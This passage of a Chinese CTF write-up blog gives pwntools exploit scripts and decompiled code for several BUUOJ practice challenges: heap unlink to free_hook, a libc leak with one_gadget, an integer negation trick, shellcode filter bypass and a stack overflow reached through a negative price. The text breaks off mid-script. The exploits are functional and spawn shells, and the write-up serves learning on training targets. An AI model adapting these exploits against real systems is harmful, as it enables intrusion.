class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27457</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line">pal=<span class="string">b&#x27;%15$p.%19$p&#x27;</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sla(<span class="string">&#x27;Enter your name: &#x27;</span>,pal)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">ru(<span class="string">&#x27;Hello, 0x&#x27;</span>)</span><br><span class="line"><span class="comment">#data=p64(int(r(12),16))</span></span><br><span class="line">start_main=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">&#x27;.0x&#x27;</span>)</span><br><span class="line">bss_addr=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x116a</span>+<span class="number">0x202000</span></span><br><span class="line">leak(<span class="string">&#x27;bss_addr&#x27;</span>,bss_addr)</span><br><span class="line">leak(<span class="string">&#x27;start_main&#x27;</span>,start_main)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">libc_base=start_main-<span class="number">0x20830</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">system_addr=libc_base+<span class="number">0x45390</span></span><br><span class="line">free_hook=libc_base+<span class="number">0x3C67A8</span></span><br><span class="line">leak(<span class="string">&#x27;free_hook&#x27;</span>,free_hook)</span><br><span class="line">leak(<span class="string">&#x27;system&#x27;</span>,system_addr)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Enter the index you want to create (0-10):&#x27;</span>,tbs(index))</span><br><span class="line">    sla(<span class="string">&#x27;Enter a size:\n&#x27;</span>,tbs(size))</span><br><span class="line">    sla(<span class="string">&#x27;Enter the content: \n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Enter an index:\n&#x27;</span>,tbs(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Enter an index:\n&#x27;</span>,tbs(index))</span><br><span class="line">    sla(<span class="string">&#x27;Enter the content: \n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#enter size&gt;0x80 else exit</span></span><br><span class="line">note_addr=bss_addr+<span class="number">0x60</span></span><br><span class="line">fake_fd=note_addr-<span class="number">0x8</span></span><br><span class="line">fake_bk=note_addr</span><br><span class="line">pal=p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(fake_fd)+p64(fake_bk)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0x90</span>)+<span class="string">b&#x27;\xa0&#x27;</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>,<span class="string">b&#x27;s1nec-1o&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x98</span>,<span class="string">b&#x27;s1nec-1o&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x98</span>,<span class="string">b&#x27;s1nec-1o&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x98</span>,<span class="string">b&#x27;s1nec-1o&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,pal)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x98</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">pal=p64(<span class="number">0</span>)+p64(free_hook)+p64(<span class="number">0x98</span>)</span><br><span class="line">edit(<span class="number">1</span>,pal)</span><br><span class="line">edit(<span class="number">0</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">debug()</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h1 id="oneshot-tjctf-2016"><a href="#oneshot-tjctf-2016" class="headerlink" title="oneshot_tjctf_2016"></a>oneshot_tjctf_2016</h1><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653177.png" alt="image-20240508205504223" style="zoom:50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 (*v4)(<span class="type">void</span>); <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Read location?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Value: 0x%016lx\n&quot;</span>, *(_QWORD *)v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Jump location?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good luck!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v4();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意：long int在linux是8字节的，在windows是4字节的（无论32 or 64）</p></blockquote><p>这里首先是让我们输入v4的值然后泄露v4作为地址其上内容的值，之后还能再次输入v4的值，之后以v4为函数基址执行函数，就想到首先先泄露libc然后执行one_gadget（属实可供操控的内容较少只能试试看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./oneshot&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26690</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">p=run()</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sla(<span class="string">&#x27;Read location?\n&#x27;</span>,<span class="built_in">str</span>(puts_got))</span><br><span class="line">ru(<span class="string">&#x27;Value: 0x&#x27;</span>)</span><br><span class="line">puts_addr=<span class="built_in">int</span>(r(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&#x27;puts_addr&#x27;</span>,puts_addr)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">libc_base=puts_addr-<span class="number">0x6F690</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">one_gadget=libc_base+<span class="number">0x45216</span> <span class="comment">#0x45216 0x4526a 0xf02a4 0xf1147</span></span><br><span class="line">sla(<span class="string">&#x27;Jump location?\n&#x27;</span>,<span class="built_in">str</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>也算是运气不错，一把过</p><h1 id="wustctf2020-number-game"><a href="#wustctf2020-number-game" class="headerlink" title="wustctf2020_number_game"></a>wustctf2020_number_game</h1><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653178.png" alt="image-20240508213032791" style="zoom:50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> || (v1 = -v1, v1 &gt;= <span class="number">0</span>) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You lose&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    shell();</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题要绕过第一个if然后就能实现shell了，那绕过变成了困难，首先v1是int型范围在-2147483648~2147483647之间，那么如果取-2147483648他的原码是0x80000000，而取反是取补码然后+1，所以他的补码也是0x80000000，就能实现shell</p><h1 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" class="headerlink" title="starctf_2019_babyshell"></a>starctf_2019_babyshell</h1><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653179.png" alt="image-20240508215231736" style="zoom:50%;" /><p>这题算是一个\x00的妙用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  sub_4007F8(a1, a2, a3);</span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;give me shellcode, plz:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_400786(buf) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;wrong shellcode!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以执行shellcode但是要先绕过if的检查</p><p>而检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_400786</span><span class="params">(_BYTE *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *i; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="string">&quot;ZZJ loves shell_code,and here is a gift:\x0F\x05 enjoy it!\n&quot;</span>; *i &amp;&amp; *i != *a1; ++i )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( !*i )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    ++a1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>却非常阴间，如果真的按照这个去执行，很难才能get shell，笔者还是太菜了，想不出来看了网上大佬的wp，发现我只注意for循环却没注意到第一个while(*a1)只要让这个为假就能跳过了，因此在shell开头扔个\x00即可跳过检查，再后面搭配几个字节码凑个汇编之后加上自己的shellcode就可以getshell了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shell=<span class="string">b&#x27;\x00\x42\x00&#x27;</span>+asm(shellcraft.amd64.linux.sh())</span><br><span class="line">p=process(<span class="string">&#x27;./babyshell&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;plz:\n&#x27;</span>)</span><br><span class="line">p.sendline(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://defuse.ca/online-x86-assembler.htm#disassembly%E8%BF%99%E5%8F%AF%E4%BB%A5%E5%AE%9E%E7%8E%B0%E6%9C%BA%E5%99%A8%E7%A0%81%E8%BD%AC%E6%B1%87%E7%BC%96%EF%BC%8C%E5%9B%A0%E4%B8%BA%E8%A6%81%E6%89%BE\x00%E4%B9%8B%E5%90%8E%E6%8E%A5%E7%9A%84%E6%9C%BA%E5%99%A8%E7%A0%81%E5%90%8E%E7%9A%84%E6%B1%87%E7%BC%96%E3%80%82%E3%80%82">https://defuse.ca/online-x86-assembler.htm#disassembly这可以实现机器码转汇编，因为要找\x00之后接的机器码后的汇编。。</a></p><p>还是太菜了，任重而道远。。。</p><h1 id="gyctf-2020-some-thing-exceting"><a href="#gyctf-2020-some-thing-exceting" class="headerlink" title="gyctf_2020_some_thing_exceting"></a>gyctf_2020_some_thing_exceting</h1><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653180.png" alt="image-20240509003059436" style="zoom:50%;" /><h1 id="CISCN-2023-烧烤摊儿"><a href="#CISCN-2023-烧烤摊儿" class="headerlink" title="CISCN-2023 烧烤摊儿"></a>CISCN-2023 烧烤摊儿</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r9d</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)menu(*(__int64 *)&amp;argc, (__int64)argv, v3, v4, v5, v6) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        pijiu();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        chuan();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        yue(*(__int64 *)&amp;argc, (__int64)argv, v3, v4, v5, v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        vip();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( own )</span><br><span class="line">          gaiming();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>((<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_4B7008, (_DWORD)argv, v3, v4, v5, v6);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">menu</span><span class="params">(__int64 a1, __int64 a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5, <span class="type">int</span> a6)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;欢迎来到%s烧烤摊儿，来点啥？\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;name, a3, a4, a5, a6);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. 啤酒&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. 烤串&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. 钱包余额&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. 承包摊位&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( own )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. 改名&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;0. 离开&quot;</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;&gt;&#x27;</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">  _isoc99_scanf((<span class="type">unsigned</span> <span class="type">int</span>)&amp;_d, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v11, v6, v7, v8, v9);</span><br><span class="line">  <span class="keyword">return</span> v11;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现当own为真时有新的选项</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">gaiming</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;烧烤摊儿已归你所有，请赐名：&quot;</span>);</span><br><span class="line">  _isoc99_scanf((<span class="type">unsigned</span> <span class="type">int</span>)&amp;_s, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v5, v0, v1, v2, v3);<span class="comment">// 栈溢出</span></span><br><span class="line">  j_strcpy_ifunc();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中有个栈溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">pijiu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> choose; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  choose = <span class="number">1</span>;</span><br><span class="line">  num = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. 青岛啤酒&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. 燕京U8&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. 勇闯天涯&quot;</span>);</span><br><span class="line">  _isoc99_scanf((<span class="type">unsigned</span> <span class="type">int</span>)&amp;_d, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;choose, v0, v1, v2, v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;来几瓶？&quot;</span>);</span><br><span class="line">  _isoc99_scanf((<span class="type">unsigned</span> <span class="type">int</span>)&amp;_d, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;num, v4, v5, v6, v7);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10</span> * num &gt;= money )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;诶哟，钱不够了&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    money += <span class="number">-10</span> * num;</span><br><span class="line">  <span class="built_in">puts</span>(&amp;unk_4B7105);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现这个计算钱的方式很奇怪，当买的为负数时，会加钱，而加钱可以买摊位，然后就有栈溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 